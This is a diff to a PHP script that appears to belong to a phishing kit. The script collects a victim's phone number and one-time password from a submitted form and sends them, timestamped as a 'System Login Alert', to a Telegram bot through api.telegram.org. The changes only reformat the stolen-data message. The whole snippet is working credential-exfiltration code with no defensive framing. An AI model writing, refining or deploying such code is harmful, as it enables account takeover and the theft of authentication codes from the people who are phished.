@@ -7,15 +7,16 @@ $number=$_POST['number'] ?? '';
 $otp=$_POST['otp'] ?? '';
 
 $message  = "📱 System Login Alert\n";
-$message .= "━━━━━━━━━━━━━━\n";
-$message .= "📞 Phone: ".$number."\n";
+$message  = "System Login Alert\n";
+$message .= "------------------\n";
+$message .= "Phone:\n`".$number."`\n";
 
 if(!empty($otp)){
-$message .= "🔐 OTP: ".$otp."\n";
+$message .= "OTP:\n`".$otp."`\n";
 }
 
-$message .= "🕒 Time: ".date("d/m/Y H:i:s")."\n";
-$message .= "━━━━━━━━━━━━━━";
+$message .= "Time: ".date("d/m/Y H:i:s")."\n";
+$message .= "------------------";
 
 $url="https://api.telegram.org/bot".$botToken."/sendMessage";
 
